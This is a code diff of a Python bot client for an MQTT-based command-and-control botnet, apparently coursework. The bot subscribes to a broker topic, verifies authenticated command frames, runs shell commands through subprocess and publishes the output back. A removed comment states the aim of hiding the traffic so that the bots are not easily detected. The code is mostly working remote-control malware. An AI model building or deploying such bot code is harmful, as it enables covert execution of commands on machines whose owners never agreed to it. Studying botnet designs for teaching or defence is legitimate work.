@@ -4,7 +4,9 @@ from globvars import DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC, CMD_TY
 from datetime import datetime
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
+from protocol import ProtocolHandler
 import subprocess
+import time
 
 class BotController:
     '''
@@ -15,20 +17,13 @@ class BotController:
         5) Publishing / Receiving 
     '''
     def __init__(self,
-                 broker_address:str = DEFAULT_BROKER_ADDRESS,
-                 port: int = DEFAULT_PORT,
-                 topic: str = DEFAULT_TOPIC,
                  secret_key: str = ROOT_SECRET):
-        self.broker_address = broker_address
-        self.port = port
-        self.topic = topic
-        self.client = Client(broker_address, port, topic)
         self.secret = self._derive_session_key(secret_key)
         print("Bot Controller initialized.")
         print(f"Derived session key: {self.secret}")
     
     def start(self):
-        self.client.connect()
+        self.client.start()
 
     def _derive_session_key(self, root_secret):
         # Use Argon2id to derive a session key from the root secret and timestamp
@@ -66,6 +61,10 @@ class BotController:
             return CMD_TYPES["kill"], b""
 
         raise ValueError("No valid command provided.")
+
+    def response_to_type(self, resp) -> int:
+        pass
+
 
     def handle_announce(self, payload: bytes):
         msg = payload.decode(errors="ignore")
@@ -114,7 +113,8 @@ class BotController:
         return RESP_TYPES["ok"], subp_command.stdout
 
     def handle_kill(self, payload: bytes):
-        exit()
+        # return value for keep alive boolean variable
+        return False 
 
     def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
         handlers = {
@@ -132,77 +132,60 @@ class BotController:
             return RESP_TYPES["error"], b"Unknown command"
         
         return handler(payload)
-class Client:
-    def _on_connect(self, client, userdata, flags, reason_code, properties):
-        print(f"Connected with result code {reason_code}")
+
+class Subscriber:
+    def __init__(self, broker, port, topic, secret_key):
+        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
+        self.client.on_connect = self.on_connect
+        self.client.on_message = self.on_message
+        self.broker = broker
+        self.port = port
+        self.topic = topic
+        self.bot_controller = BotController(secret_key=secret_key)
+        self.ph = ProtocolHandler(secret=self.bot_controller.secret)
+        self.keep_alive = True
+    
+    def on_connect(self, client, userdata, flags, reason_code, properties):
+        print("Connected")
         client.subscribe(self.topic)
-    
-    #     You must hide your communication and the controller should not be easily detected as 'bots' in the topic.
-    # Filter those messages meant for the bot
-    def _on_message(self, client, userdata, message):
-        raw_payload = message.payload.decode()
+
+    def on_message(self, client, userdata, message):
         try:
-            decoded = base64.b32decode(raw_payload).decode(errors="ignore")
-            print(f"Message received on topic {message.topic}: {decoded}")
+            decoded_m = self.ph.decode_frame(message.payload)
+            if self.ph.verify_frame_bot_side(decoded_m):
+                print("Message verified!")
+                magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
+                print(f"Cmd: {cmd_type};\nPayload: {payload}")
+                r, p = self.bot_controller.handle_commands(cmd_type=cmd_type, payload=payload)
+                print(f"Ran the command with response '{r}'.\nOutput: '{p}'")
+
+                # send response
+                try:
+                    frame = self.ph.build_frame(r, p)
+                    encoded_frame  = self.ph.encode_frame(frame)
+                    print(encoded_frame)
+                    self.send(encoded_frame)
+                    time.sleep(1)
+                except Exception as e:
+                    pass
+                    # print(f"Exception: {e}")
+
         except Exception as e:
-            print(f"(!) Failed to decode message: {e}")
-            print(f"Message received on topic {message.topic}: {raw_payload}")
-
-    def connect(self):
-        self.client.connect(self.broker_address, self.port)
-        self.client.loop_forever()
-    
-    def disconnect(self):
-        self.client.loop_stop()
-        self.client.disconnect()
-    
-    def publish(self, payload: bytes, qos: int=0, retain: bool=False):
-        if not isinstance(payload, (bytes, bytearray)):
-            raise TypeError("Payload must be bytes")
-
-        result = self.client.publish(
-            topic=self.topic,
-            payload=payload,
-            qos=qos,
-            retain=retain
-        )
-
-        status = result.rc
-        if (status != mqtt.MQTT_ERR_SUCCESS):
-            print(f"Failed to publish message (rc={status})")
+            pass
+            # print(f"Exception: {e}")
+        
+    def send(self, payload: bytes):
+        status = self.client.publish(self.topic, payload)
+        if status.rc != mqtt.MQTT_ERR_SUCCESS:
+            print(f"Could not publish the message: {status.rc}")
         else:
             print(f"Successfully published!")
 
-
-    def __init__(self,
-                 broker_address:str,
-                 port: int,
-                 topic: str):
-        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2) # taken from the docs 
-        self.broker_address = broker_address
-        self.port = port
-        self.topic = topic
-        self.client.on_connect = self._on_connect
-        self.client.on_message = self._on_message
-
+    def start(self):
+        self.client.connect(self.broker, self.port)
+        self.client.loop_forever()
 
 def main():
-    bot_cont = BotController(
-        broker_address=DEFAULT_BROKER_ADDRESS,
-        port=DEFAULT_PORT,
-        topic=DEFAULT_TOPIC,
-        secret_key=ROOT_SECRET
-    )
-    bot_cont.start()
-
-    # message = ""
-    # with open("out_frame.bin", "rb") as f:
-    #     message = f.read()
-    # print("Loaded message from out_frame.bin")
-    # protocol_handler = ProtocolHandler(secret=bot_cont.secret)
-    # decoded_m = protocol_handler.decode_frame(message)
-    # print(protocol_handler.verify_frame(decoded_m))
-
     # # unpack the message
     # magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
     # print(f"Cmd: {cmd_type};\nPayload: {payload}")
@@ -215,6 +198,13 @@ def main():
     # encoded_frame = protocol_handler.encode_frame(frame)
 
     # bot_cont._publish_frame(encoded_frame)
+    sub = Subscriber(
+        broker=DEFAULT_BROKER_ADDRESS,
+        port=DEFAULT_PORT,
+        topic=DEFAULT_TOPIC,
+        secret_key=ROOT_SECRET
+    )
+    sub.start()
 
 if __name__ == "__main__":
     main()
